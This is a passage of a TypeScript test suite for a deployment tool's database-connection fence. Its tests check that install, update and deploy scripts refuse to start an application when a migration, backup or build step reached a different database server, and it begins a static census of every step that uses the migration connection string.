  // ---------------------------------------------------------------------------
  // o3d-secops r33, Codex HIGH 2 — ONE BOUND CONSUMER DOES NOT CERTIFY AN UNBOUND ONE.
  //
  // THE FINDING. Every consumer of the migration URL wears the SAME stamp, the witness accumulates
  // every backend that wore it into ONE set, and the closing gate asked only whether that set was
  // non-empty. So a history in which `pg_dump` reached another cluster and prisma reached the
  // fenced one satisfied the gate: the count was positive, and both deterministic endpoint probes
  // -- the opening bind and the closing hold-stamp -- happened at moments when nothing was
  // redirected. update.sh then recorded a dump of the WRONG DATABASE as this run's restore point
  // with every gate green.
  //
  // WHAT THIS MEASURES, AND WHY IT IS TWO HALVES. Half (a) runs the r32 shape -- the opening bind
  // and the closing gate, with nothing in between -- against exactly this history, and it must
  // START. That is not decoration: without it the second half would be asserting that a refusal
  // happens, with no evidence that the mechanism it names is what refuses, and the aggregate gate
  // would still be the thing under test. Half (b) runs the SHIPPED shape, whose pins bracket each
  // consumer, against the same stub and the same history, and it must refuse and NAME THE CONSUMER.
  //
  // MUTATION ROUTE (made against the shipped file and reverted): change the `*)` arm of
  // pin_migration_window() from `die` to `warn` in this entrypoint -- half (b) then prints STARTED
  // THE NEW BUILD, which is the aggregate gate certifying a consumer that landed somewhere else.
  // Deleting the `pin_migration_window` call after that consumer does the same thing.
  test(`${entry.name}: a consumer that landed on another server is refused, though another consumer was seen on the fenced one (o3d-secops r33, Codex HIGH 2)`, () => {
    // (a) THE r32 SHAPE. Two probes, both taken while nothing is redirected, and a positive
    // sighting count contributed by the consumer that DID land correctly.
    const aggregate = mkdtempSync(join(tmpdir(), 'ims-r33agg-'))
    try {
      witnessProtocolCheckout(aggregate, { verdict: 'yes', binding: ['colocated', 'colocated'], sightings: 2 })
      const before = runShell([
        'set -uo pipefail',
        'exec 2>&1',
        entry.preamble(aggregate),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        // The consumers run HERE, and one of them is on another cluster. Nothing looks.
        'require_migration_landed_on_fenced_server',
        'echo "STARTED THE NEW BUILD"',
      ].join('\n'))

      assert.match(before.output, /^STARTED THE NEW BUILD$/m,
        `precondition: the aggregate gate must ACCEPT this history, or the pins below are not what refuses it:\n${before.output}`)
    } finally {
      rmSync(aggregate, { recursive: true, force: true })
    }

    // (b) THE SHIPPED SHAPE. The same history, with a pin between each pair of consumers: the
    // probe that follows the redirected consumer cannot see the witness, and that is the one
    // answer no other consumer's evidence can supply.
    const dir = mkdtempSync(join(tmpdir(), 'ims-r33pin-'))
    try {
      // 1: the opening bind. 2: the pin after the first consumer. 3: the pin after the SECOND --
      // the redirected one. 4: the closing hold-stamp probe, which says colocated and is never
      // reached, exactly as it would not be reached in the shipped script.
      witnessProtocolCheckout(dir, {
        verdict: 'yes',
        binding: ['colocated', 'colocated', 'absent', 'colocated'],
        sightings: 2,
      })
      const result = runShell([
        'set -uo pipefail',
        'exec 2>&1',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'pin_migration_window "The drain probe"',
        'pin_migration_window "The pre-migration backup"',
        'require_migration_landed_on_fenced_server',
        'echo "STARTED THE NEW BUILD"',
      ].join('\n'))

      const bindCalls = calls(dir).split('\n').filter((line) => /^--bind-migration /.test(line))
      assert.ok(bindCalls.length >= 3,
        `precondition: the pins must actually open probes of their own, not be skipped:\n${calls(dir)}`)
      assert.ok(bindCalls.every((line) => !/--hold-stamp/.test(line)),
        `precondition: a pin must DROP the stamp, or it would be counted as one of the consumers it separates:\n${calls(dir)}`)
      assert.doesNotMatch(result.output, /^STARTED THE NEW BUILD$/m,
        `a consumer that ran against another server must stop the run, whatever the sampler saw of the others:\n${result.output}`)
      assert.match(result.output, /The pre-migration backup DID NOT RUN AGAINST THE SERVER THIS RUN FENCED/,
        `and the refusal must name the step whose connection moved, not the window as a whole:\n${result.output}`)
      assert.match(result.output, /STILL UP/,
        `and say the fence is being held rather than released:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // ---------------------------------------------------------------------------
  // o3d-secops r33, Codex MEDIUM — A NON-REFUSING STATUS IS TESTED AT THE END OF THE RUN.
  //
  // r32 asserted status 4's behaviour AT THE GATE: the cutover went on and the flag came down.
  // The claim, though, is about the OUTCOME -- "this does not refuse" -- and two steps later the
  // release read the flag it had lowered, issued no challenge, could not set `clear_server`, took
  // status 2 out of db_fence_clear_authority() and returned FAILURE into
  // `release_db_connections || die`. An admitted polling miss therefore ended with the schema
  // migrated, the application stopped, and CONNECT briefly restored before the exit trap
  // re-fenced it.
  //
  // MEASURED, NOT REASONED ABOUT: the same shape killed the NO-WITNESS run as well, which is the
  // degraded mode this subsystem promises never to refuse -- every host behind a transaction-mode
  // pooler and every single-database cluster. Both are exercised below, to the end of the run.
  //
  // MUTATION ROUTE (all made against the shipped files and reverted): restore
  // `DB_FENCE_WITNESS_BOUND=0` in place of `DB_FENCE_KEEP_RECORD=1` in the `4)` arm -- the
  // status-4 case stops printing STARTED THE NEW BUILD. Restore the unconditional `return 1` under
  // `clear_rc -eq 2` in this entrypoint's release -- the no-witness case stops printing it.
  const runToTheEnd = (dir: string) => [
    'set -uo pipefail',
    'exec 2>&1',
    entry.preamble(dir),
    'error() { echo "ERROR: $*" >&2; }',
    'DB_FENCE_RAISED=false',
    CUTOVER_DIR_PRIMITIVES,
    shellFunction(entry.source, 'fence_db_connections'),
    shellFunction(entry.source, 'release_db_connections'),
    // The record's fate is read from an EXIT trap, so it is reported on the path where the run
    // dies as well as on the path where it completes.
    'trap \'[[ -e "${DB_FENCE_STATE}" ]] && echo AUTHORITY_REMAINS || echo AUTHORITY_CLEARED\' EXIT',
    'fence_db_connections',
    'echo "FENCE UP=${DB_FENCE_UP}"',
    // A CONSUMER AND ITS PIN, so the pin's own degraded arm is exercised to the end of the run as
    // well: with no witness db_fence_migration_pinned() returns 3, and THAT claim -- "not a
    // refusal" -- is the same shape as the two below it.
    'pin_migration_window "The migration"',
    'require_migration_landed_on_fenced_server',
    // AND THEN THE REST OF THE RUN, in the order every entrypoint has it: the database fence comes
    // down, and only a release that succeeded lets anything start.
    'release_db_connections || die "Refusing to start the application while it has no CONNECT on its own database."',
    'echo "STARTED THE NEW BUILD"',
  ].join('\n')

  test(`${entry.name}: a sampling miss keeps the record and still finishes the run (o3d-secops r33, Codex MEDIUM)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r33miss-'))
    try {
      // The closing probe binds and IS seen, so the string is where it should be and the sampler
      // works; what was never seen is a backend carrying the stamp while the migration ran.
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: 'colocated', sightings: 0 })
      const result = runShell(runToTheEnd(dir))

      assert.match(result.output, /^FENCE UP=true$/m,
        `precondition: the gate returns at once without a fence, so one must be standing:\n${result.output}`)
      assert.match(calls(dir), /^--bind-migration --hold-stamp /m,
        `precondition: the closing probe must have run, or this is not the status-4 path:\n${calls(dir)}`)
      assert.match(calls(dir), /^--release .*--witness-challenge=[0-9a-f]{32}/m,
        `and the witness must still be bound at release time -- "keep the record" is not "there is no witness":\n${calls(dir)}`)
      assert.match(result.output, /^STARTED THE NEW BUILD$/m,
        `a miss is a property of polling, so it must cost the record and not the cutover:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_REMAINS$/m,
        `and the record must be the thing it costs:\n${result.output}`)
      assert.match(result.output, /KEPT/,
        `and the operator must be told that is what happened:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name}: a cutover that could hold no witness finishes the run rather than dying at the release (o3d-secops r33, Codex MEDIUM)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r33nowitness-'))
    try {
      const helper = writeFenceCheckout(dir, '')
      writeFileSync(helper, [
        "import { appendFileSync } from 'node:fs'",
        `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
        "if (process.argv.includes('--witness')) process.exit(1)",
        "if (process.argv.includes('--plan')) {",
        "  process.stdout.write(JSON.stringify({",
        "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
        "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
        "  }) + '\\n')",
        '}',
        "if (process.argv.includes('--print-migration-url')) process.stdout.write(`postgres://admin@127.0.0.1/nowhere?application_name=ims-migration-${process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''}\\n`)",
        'process.exit(0)',
        '',
      ].join('\n'))
      const result = runShell(runToTheEnd(dir))

      assert.match(result.output, /^FENCE UP=true$/m,
        `precondition: a fence must be standing, or nothing here is about a release:\n${result.output}`)
      assert.doesNotMatch(calls(dir), /^--release .*--witness-challenge=/m,
        `precondition: with no witness there is no challenge to put, which is the state under test:\n${calls(dir)}`)
      assert.match(result.output, /^STARTED THE NEW BUILD$/m,
        `a host that can hold no witness must be able to complete a cutover, not merely reach the migration:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_REMAINS$/m,
        `with the record kept for a person, which is the whole of what the degraded mode costs:\n${result.output}`)
      assert.match(result.output, /KEPT/,
        `and the operator told so:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // AND THE ORDINARY CUTOVER IS STILL UNATTENDED. Both fixes above make a run CONTINUE where it
  // used to stop, so the direction that has to be held is the other one: a run whose witness saw
  // everything must still end its own record with nobody at a terminal.
  // MUTATION ROUTE (made against the shipped file and reverted): set DB_FENCE_KEEP_RECORD=1
  // unconditionally in this entrypoint's release -- AUTHORITY_CLEARED becomes AUTHORITY_REMAINS
  // and every deploy starts asking a human.
  test(`${entry.name}: an ordinary cutover still ends its own record with nobody at a terminal (o3d-secops r33 control)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r33ordinary-'))
    try {
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: 'colocated', sightings: 2 })
      const result = runShell(runToTheEnd(dir))

      assert.match(calls(dir), /^--bind-migration --hold-stamp /m,
        `precondition: the closing probe must have run:\n${calls(dir)}`)
      assert.match(result.output, /^STARTED THE NEW BUILD$/m,
        `an ordinary cutover must complete:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_CLEARED$/m,
        `and remove its own record without a person:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // ---------------------------------------------------------------------------
  // o3d-secops r34, Codex HIGH 1 — THE CROSS-PRODUCT: A SAMPLING MISS *AND* A NON-COLOCATED VERDICT.
  //
  // The two cases above are each other's opposites and r33 got both of them right on their own. It
  // is where they MEET that the fix inverted: the keep-record fast path was written between the
  // line that computes `clear_server` and the line that acts on it, so a run that had put a
  // challenge to a live witness and been told `RELEASE_WITNESS <nonce> absent` returned 0 as long
  // as ${DB_FENCE_KEEP_RECORD} was set -- and the closing gate sets that flag on exactly the run
  // whose routing is in question. The application started against a copy of the cluster while the
  // server this run actually fenced stayed shut.
  //
  // BOTH HALVES ARE REAL HERE, not asserted about: `sightings: 0` drives the gate down its status-4
  // arm and sets the flag, and `verdict: 'no'` makes the shipped `--release` answer this run's own
  // nonce with `absent`. The preconditions below prove both happened before the outcome is read,
  // because a run that failed for some third reason would satisfy the outcome perfectly.
  //
  // MUTATION ROUTE (made against the shipped files and reverted): move the r34 refusal back below
  // the `${DB_FENCE_KEEP_RECORD}` fast path, which is exactly r33 -- this test prints STARTED THE
  // NEW BUILD and AUTHORITY_REMAINS, and the two r33 tests above stay green.
  test(`${entry.name}: a sampling miss AND a non-colocated verdict refuses, rather than being waved through by the kept record (o3d-secops r34, Codex HIGH 1)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r34cross-'))
    try {
      witnessProtocolCheckout(dir, { verdict: 'no', binding: 'colocated', sightings: 0 })
      const result = runShell(runToTheEnd(dir))

      assert.match(result.output, /^FENCE UP=true$/m,
        `precondition: a fence must be standing, or nothing here is about a release:\n${result.output}`)
      assert.match(calls(dir), /^--bind-migration --hold-stamp /m,
        `precondition: the closing probe must have run, or this is not the sampling-miss path:\n${calls(dir)}`)
      assert.match(result.output, /KEPT/,
        `precondition: the sampling miss must have decided to keep the record, which is the flag under test:\n${result.output}`)
      assert.match(calls(dir), /^--release .*--witness-challenge=[0-9a-f]{32}/m,
        `precondition: a challenge must actually have been put to a live witness:\n${calls(dir)}`)
      assert.match(result.output, /RELEASE_WITNESS [0-9a-f]{32} absent/,
        `precondition: and the release's own connection must have answered that it could not see it:\n${result.output}`)

      assert.doesNotMatch(result.output, /^STARTED THE NEW BUILD$/m,
        `a release that may have landed on a copy must not start the application, whatever the record's fate:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_REMAINS$/m,
        `and the record must survive, because it is the only account of the fence still standing:\n${result.output}`)
      assert.match(result.output, /deliberately NOT removed/,
        `and the operator must be told which of the two readings this was:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // ---------------------------------------------------------------------------
  // o3d-secops r34, Codex HIGH 2 — A CONSUMER THAT MOVED SCHEMA AND THEN FAILED IS STILL PLACED,
  // AND A PLACEMENT REFUSAL OUTRANKS ITS EXIT STATUS.
  //
  // THE SHAPE UNDER TEST IS THE SHIPPED ONE, and which shape that is, is settled statically by the
  // r34 census below -- every consumer in every entrypoint captures its status, runs its placement,
  // and propagates afterwards. What is measured HERE is that the shape behaves as the comment
  // beside it claims, against the entrypoint's own pin_migration_window() and under `set -e`,
  // which is what made the old shape fatal to the chain.
  //
  // THE FOIL IS PART OF THE TEST. The same rig runs r33's shape -- the consumer bare under
  // `set -e`, the pin on the line below -- and asserts that the pin's probe NEVER RUNS. Without it
  // this test would be a guard nobody has seen fail: three assertions about a run that took the
  // right path anyway.
  for (const [label, binding, expectation] of [
    ['a redirected consumer', 'absent', 'placement'],
    ['a consumer on the fenced server', 'colocated', 'status'],
  ] as ReadonlyArray<[string, 'absent' | 'colocated', 'placement' | 'status']>) {
    test(`${entry.name}: ${label} that half-applies and then fails is still placed, and the ${expectation} is what is reported (o3d-secops r34, Codex HIGH 2)`, () => {
      const dir = mkdtempSync(join(tmpdir(), 'ims-r34pinfail-'))
      try {
        // Bind 1 is fence_db_connections()'s own opening bind and must succeed or the run never
        // reaches the consumer. Bind 2 is the pin's, and is the answer this case is about.
        witnessProtocolCheckout(dir, { verdict: 'yes', binding: ['colocated', binding] })
        const shipped = [
          'set -euo pipefail',
          'exec 2>&1',
          entry.preamble(dir),
          'error() { echo "ERROR: $*" >&2; }',
          'DB_FENCE_RAISED=false',
          CUTOVER_DIR_PRIMITIVES,
          shellFunction(entry.source, 'fence_db_connections'),
          'fence_db_connections',
          // THE SHIPPED SHAPE. A consumer that writes and then exits non-zero -- a migration that
          // applied three statements and failed on the fourth is exactly this.
          'migrate_rc=0',
          '( echo "PARTIAL DDL APPLIED"; exit 7 ) || migrate_rc=$?',
          'pin_migration_window "The migration"',
          '[[ "${migrate_rc}" -eq 0 ]] || die "THE MIGRATION EXITED ${migrate_rc}"',
          'echo "STARTED THE NEW BUILD"',
        ].join('\n')
        const result = runShell(shipped)
        const bindCalls = calls(dir).split('\n').filter((line) => /^--bind-migration /.test(line))

        assert.match(result.output, /PARTIAL DDL APPLIED/,
          `precondition: the consumer must really have run and written before failing:\n${result.output}`)
        assert.ok(bindCalls.length >= 2,
          `the pin must open its own probe even though the consumer exited non-zero — this is the whole finding:\n${calls(dir)}`)
        assert.doesNotMatch(result.output, /^STARTED THE NEW BUILD$/m,
          `and nothing may start after a consumer that failed:\n${result.output}`)

        if (expectation === 'placement') {
          assert.match(result.output, /The migration DID NOT RUN AGAINST THE SERVER THIS RUN FENCED/,
            `a step that both failed AND cannot be placed must report the PLACEMENT, which is the more serious answer:\n${result.output}`)
          assert.doesNotMatch(result.output, /THE MIGRATION EXITED 7/,
            `and the exit status must not mask it — "prisma exited 7" sends an operator to the wrong server:\n${result.output}`)
        } else {
          assert.equal((result.output.match(/MIGRATION_BINDING [0-9a-f]{32} colocated/g) ?? []).length, 2,
            `precondition: this arm is the one where the pin's own probe answered colocated:\n${result.output}`)
          assert.match(result.output, /THE MIGRATION EXITED 7/,
            `and once the placement is established the consumer's own failure must still be propagated:\n${result.output}`)
        }
      } finally {
        rmSync(dir, { recursive: true, force: true })
      }
    })
  }

  // THE FOIL, RUN AGAINST THE SAME RIG. r33's shape -- the consumer bare under `set -e` -- and the
  // pin below it. The shell leaves before the pin, so its probe never opens, and this is what the
  // assertion above would have been unable to see if the rig could not detect it.
  test(`${entry.name}: the r33 shape really did skip the pin, and this rig can see it (o3d-secops r34, Codex HIGH 2 foil)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r34foil-'))
    try {
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: ['colocated', 'absent'] })
      const r33Shape = [
        'set -euo pipefail',
        'exec 2>&1',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        '( echo "PARTIAL DDL APPLIED"; exit 7 )',
        'pin_migration_window "The migration"',
        'echo "STARTED THE NEW BUILD"',
      ].join('\n')
      const result = runShell(r33Shape)
      const bindCalls = calls(dir).split('\n').filter((line) => /^--bind-migration /.test(line))

      assert.match(result.output, /PARTIAL DDL APPLIED/,
        `precondition: the consumer ran and wrote:\n${result.output}`)
      assert.equal(bindCalls.length, 1,
        `the old shape must reach ONLY the opening bind — if the pin's probe ran here, the rig is not measuring what it claims:\n${calls(dir)}`)
      assert.doesNotMatch(result.output, /DID NOT RUN AGAINST THE SERVER THIS RUN FENCED/,
        `and nothing asked where that DDL landed, which is the defect:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // ---------------------------------------------------------------------------
  // o3d-secops r34 — A FAILED CONSUMER'S OWN DIAGNOSTIC AND CLEANUP SURVIVE A PLACEMENT REFUSAL.
  //
  // A REGRESSION THIS ROUND INTRODUCED AND THEN CLOSED. Moving each pin ABOVE its propagation put
  // two things below a statement that can now `die`: deploy.sh's `tail -40 "$BUILD_LOG"`, which is
  // the only place a build's own output is ever shown, and update.sh's `rm -f "${BACKUP_PARTIAL}"`,
  // which is what stops a truncated dump sitting on disk under a name nothing marks as
  // not-a-restore-point. On a run that ADOPTED a fence, a consumer that fails AND a pin that
  // refuses is one run, and it is the run that needed both answers: it would have printed the
  // placement refusal alone, with the build's errors unshown and the partial file left behind.
  //
  // BOTH NOW LIVE INSIDE THE FAILING STATEMENT, so they run before anything below can leave. This
  // measures that against the entrypoint's own pin_migration_window() under `set -e`, and runs THE
  // FIRST DRAFT OF THIS ROUND beside it in the same rig -- which must lose both, or the assertions
  // above it are about a difference the rig cannot see.
  for (const [label, inside] of [['the shipped shape', true], ['the first draft', false]] as ReadonlyArray<[string, boolean]>) {
    test(`${entry.name}: ${label} — a failed consumer's diagnostic and cleanup ${inside ? 'survive' : 'are lost to'} a placement refusal (o3d-secops r34)`, () => {
      const dir = mkdtempSync(join(tmpdir(), 'ims-r34diag-'))
      const partial = join(dir, 'pre-update.sql.gz.part')
      try {
        // Bind 1 is the opening bind and must succeed; bind 2 is the pin's, and it refuses.
        witnessProtocolCheckout(dir, { verdict: 'yes', binding: ['colocated', 'absent'] })
        const consumer = `( echo "TYPE ERROR IN app/page.tsx"; echo partial > "$BACKUP_PARTIAL"; exit 2 ) >"$BUILD_LOG" 2>&1`
        const cleanup = 'tail -40 "$BUILD_LOG" >&2; rm -f "$BACKUP_PARTIAL";'
        const result = runShell([
          'set -euo pipefail',
          'exec 2>&1',
          entry.preamble(dir),
          'error() { echo "ERROR: $*" >&2; }',
          'DB_FENCE_RAISED=false',
          CUTOVER_DIR_PRIMITIVES,
          shellFunction(entry.source, 'fence_db_connections'),
          'fence_db_connections',
          `BUILD_LOG='${join(dir, 'build.log')}'`,
          `BACKUP_PARTIAL='${partial}'`,
          'build_rc=0',
          inside ? `${consumer} || { build_rc=$?; ${cleanup} }` : `${consumer} || build_rc=$?`,
          'pin_migration_window "The build"',
          ...(inside ? [] : [`if [[ "$build_rc" -ne 0 ]]; then ${cleanup} fi`]),
          '[[ "$build_rc" -eq 0 ]] || die "Build failed — see $BUILD_LOG."',
          'echo "STARTED THE NEW BUILD"',
        ].join('\n'))
        const bindCalls = calls(dir).split('\n').filter((line) => /^--bind-migration /.test(line))

        // THE PRECONDITIONS, identical for both shapes: the consumer wrote and failed, the pin ran
        // and refused, and nothing started. Only what happened to the diagnostic differs.
        assert.ok(bindCalls.length >= 2,
          `precondition: the pin must have opened its own probe:\n${calls(dir)}`)
        assert.match(result.output, /The build DID NOT RUN AGAINST THE SERVER THIS RUN FENCED/,
          `precondition: this case is the one where the placement refuses:\n${result.output}`)
        assert.doesNotMatch(result.output, /^STARTED THE NEW BUILD$/m,
          `precondition: nothing may start:\n${result.output}`)

        if (inside) {
          assert.match(result.output, /TYPE ERROR IN app\/page\.tsx/,
            `the build's own output is the only account of WHY it failed, and a placement refusal must not swallow it:\n${result.output}`)
          assert.ok(!existsSync(partial),
            'and the truncated dump must be gone: a .part file left by this path is one nothing marks as not-a-restore-point')
        } else {
          assert.doesNotMatch(result.output, /TYPE ERROR IN app\/page\.tsx/,
            `the first draft must LOSE the diagnostic, or this rig cannot see the difference the shipped shape makes:\n${result.output}`)
          assert.ok(existsSync(partial),
            'and must leave the truncated dump behind, which is the second half of the same regression')
        }
      } finally {
        rmSync(dir, { recursive: true, force: true })
      }
    })
  }
}

// ---------------------------------------------------------------------------
// o3d-secops r33, Codex HIGH 1 — THE CENSUS OF DATABASE CONSUMERS, TAKEN FROM THE ENTRYPOINTS.
//
// THE FINDING. The closing gate was placed after what a COMMENT called "every consumer", and the
// comment was written from the author's own list rather than from the file. install.sh had SEVEN
// consumers inside the fenced window and the list named five: `npm run db:seed` and
// `provision-instance.mjs` both ran AFTER the window had been declared closed, on the same movable
// ${MIGRATION_DATABASE_URL}, so a DNS change, a proxy or a failover taking effect after the gate
// sent the seed, the default administrator, the SMTP configuration and the WooCommerce credentials
// to another cluster and returned. Nothing looked afterwards, and the run then attested against
// the original server and started the application there.
//
// SO THE LIST IS NOT WRITTEN DOWN IN A COMMENT ANY MORE. This walks each shipped entrypoint,
// finds every TOP-LEVEL step that hands a process the migration connection string, and requires
// each one to be followed by a placement -- a pin, or the closing gate -- before the next one
// begins. A consumer added below the gate in some future round fails here rather than being
// discovered by a reviewer reading a stale list.
//
// THE EXPECTED SET IS SPELLED OUT AS WELL AS THE RULE, because a walk that found nothing would
// satisfy "every consumer is placed" perfectly. The count is asserted, the labels are asserted,
// and the two facts are read out of the same scan.
//
// MUTATION ROUTE (all made against the shipped files and reverted): move
// `require_migration_landed_on_fenced_server` in install.sh back above `header "Seeding
// database"` -- the seed and the bootstrap then trail the last placement and this fails naming
// both. Delete any single `pin_migration_window` line -- the consumer above it becomes unplaced.
// Add a new `DATABASE_URL="${MIGRATION_DATABASE_URL}"` step after the gate -- the expected-set
// assertion fails until it is placed.
// ---------------------------------------------------------------------------

/**
 * THE CENSUS KEYS ON THE URL ITSELF, NOT ON THE FORMS IT HAS BEEN SPELLED IN SO FAR
 * (o3d-secops r34, Codex MEDIUM).
 *
 * THE FINDING. r33 replaced a comment with a census, and the census was three regexes:
 * `DATABASE_URL="${MIGRATION_DATABASE_URL}"`, `pg_dump "${MIGRATION_DATABASE_URL}"` and
 * `as_app_user_db `. A new top-level step written any other way -- `psql "$MIGRATION_DATABASE_URL"`,
 * an unquoted assignment, a command handed the URL through a name it was copied into -- matched
 * none of them, changed neither the detected list nor the expected list, and passed the census
 * exactly as before. A list of forms is a list; it was the same shape of thing as the comment it
 * replaced.
 *
 * SO IT KEYS ON THE THING. Any top-level statement that references ${MIGRATION_DATABASE_URL} AT
 * ALL, however spelled, is a database consumer that must be placed -- UNLESS it is explicitly
 * classified as one of three other things, and each of those has to earn it:
 *
 *   assignment   the statement is ENTIRELY `MIGRATION_DATABASE_URL=<value>` with no command
 *                substitution in it. It sets the name; it hands nothing to a process. An
 *                assignment whose value comes out of `$( ... )` DOES run a process and is a
 *                consumer.
 *   alias        the statement is ENTIRELY `SOME_NAME=<the URL>`, again with no command
 *                substitution. It hands nothing over either -- but SOME_NAME now carries the URL,
 *                so every later statement that mentions it is a reference in its own right. This
 *                is the indirection Codex named, and it is closed rather than described.
 *   mechanism    a call to one of the fence's own functions, named in MIGRATION_URL_MECHANISMS
 *                below. These are what RAISES, MOVES and PLACES the URL rather than steps that
 *                consume it, and every name in that table is checked to be a real function that
 *                really does touch the URL, so a stale entry cannot silently excuse a consumer.
 *
 * AND FUNCTIONS ARE FOLLOWED, ONE HOP AND THEN TO A FIXPOINT. A helper whose body names the URL --
 * `as_app_user_db()` is the shipped example, and any future one is the interesting case -- makes
 * every top-level CALL to it a reference, so moving a consumer into a helper does not remove it
 * from the census. Function bodies are read from the entrypoint AND from the fence library it
 * sources, so a consumer added to lib/db-fence-protected.sh and called from the top level of an
 * entrypoint is caught too.
 *
 * WHAT STILL ESCAPES IT, said plainly rather than papered over:
 *
 *   - A NAME COMPUTED AT RUNTIME. `eval`, `${!ref}`, `declare -n`, or a command built by string
 *     concatenation. This walk is textual; a name that does not exist until the shell runs cannot
 *     be followed by reading the file, and nothing short of running the entrypoint would find it.
 *   - THE ENVIRONMENT. If the URL were EXPORTED, a later process would inherit it without any
 *     statement naming it. No entrypoint exports it today -- every consumer is handed it as an
 *     `env NAME=value` prefix -- and that is the property this leans on rather than checks.
 *   - A CONSUMER INSIDE A FUNCTION THAT NEVER NAMES THE URL, reaching the database some other way
 *     (a `.env` file, a hard-coded string). It would not be a consumer of the MIGRATION url, which
 *     is what the fence and the pins are about, but it would still be a database consumer.
 *
 * MUTATION ROUTE (all made against the shipped files and reverted): add `psql
 * "$MIGRATION_DATABASE_URL" -c 'select 1'` below the closing gate in install.sh -- the classified
 * list gains an entry and the gate stops being the last placement, and the r33 census saw nothing.
 * Add `MIGRATION_URL_COPY=$MIGRATION_DATABASE_URL` and then `node x.mjs "$MIGRATION_URL_COPY"` --
 * the alias is classified and the command below it is an unplaced consumer. Move
 * `require_migration_landed_on_fenced_server` in install.sh back above `header "Seeding
 * database"` -- the seed and the bootstrap then trail the last placement. Delete any single
 * `pin_migration_window` line -- the consumer above it becomes unplaced. Change any consumer's
 * `|| <name>_rc=$?` back to `|| die` -- the r34 disposition rule fails naming that step.
 */

/**
 * The fence's own machinery: what raises, moves, holds and places the migration URL. Every name is
 * asserted below to be a function that really does reference the URL, in the entrypoint or in the
 * library it sources, so this table cannot become a place to hide a step.
 */
const MIGRATION_URL_MECHANISMS: ReadonlyArray<string> = [
  'fence_db_connections',
  'release_db_connections',
  'refence_db_connections',
  'adopt_db_connections',
  'adopt_existing_fence',
  'resume_from_interrupted_arming',
]

type CensusEntry = {
  kind: 'consumer' | 'assignment' | 'alias' | 'mechanism' | 'placement'
  label: string
  step: string
  line: number
  placedBy: string | null
}

/** Every function defined in `source`, as name -> body text of its logical statements. */
function shellFunctionBodies(source: string): Map<string, string> {
  const bodies = new Map<string, string>()
  let name: string | null = null
  let body: string[] = []
  for (const raw of source.split('\n')) {
    if (name === null) {
      const opens = /^([a-z_][a-z0-9_]*)\(\)\s*\{$/.exec(raw)
      if (opens) { name = opens[1]; body = [] }
      continue
    }
    if (raw === '}') { bodies.set(name, body.join('\n')); name = null; continue }
    body.push(raw)
  }
  return bodies
}

/** The names of functions that reach ${MIGRATION_DATABASE_URL}, directly or through each other. */
function migrationUrlCarriers(sources: ReadonlyArray<string>): Set<string> {
  const bodies = new Map<string, string>()
  for (const source of sources) for (const [name, body] of shellFunctionBodies(source)) bodies.set(name, body)
  const carriers = new Set<string>()
  for (const [name, body] of bodies) if (/\bMIGRATION_DATABASE_URL\b/.test(body)) carriers.add(name)
  // To a fixpoint: a helper that calls a carrier carries it too.
  for (;;) {
    let grew = false
    for (const [name, body] of bodies) {
      if (carriers.has(name)) continue
      for (const carrier of carriers) {
        if (new RegExp(`(^|[\\s;(&|!])${carrier}(\\s|$|\\))`, 'm').test(body)) { carriers.add(name); grew = true; break }
      }
    }
    if (!grew) break
  }
  return carriers
}

/**
 * Every TOP-LEVEL statement of one entrypoint that references the migration URL, classified, in
 * file order, with the placement that follows each consumer.
 *
 * ONE ENTRY PER LOGICAL STATEMENT, not per physical line. Every one of these steps is written as
 * `run_as_user ... env \` / `DATABASE_URL=... \` / `node <script>`, so a scan that read physical
 * lines would find the string on one line and the script's name on another -- and a label taken
 * from "the next few lines" reads the COMMENT ABOVE THE NEXT STEP, which is how the first draft of
 * this census reported a pg_dump in deploy.sh, which has none.
 *
 * TOP LEVEL ONLY. Function bodies are skipped by tracking the `name() {` ... `}` blocks these
 * scripts are written in -- but a call to a function that carries the URL is itself a reference,
 * so a consumer moved into a helper stays in the census instead of leaving it.
 */
function migrationConsumerCensus(lines: ReadonlyArray<string>, carriers: ReadonlySet<string>): CensusEntry[] {
  const logical: Array<{ text: string; line: number }> = []
  let buffer = ''
  let opener = 0
  lines.forEach((raw, index) => {
    const line = raw.trim()
    if (buffer === '') opener = index
    buffer = buffer === '' ? line : `${buffer} ${line}`
    if (/\\$/.test(line)) { buffer = buffer.replace(/\\$/, ''); return }
    logical.push({ text: buffer, line: opener })
    buffer = ''
  })
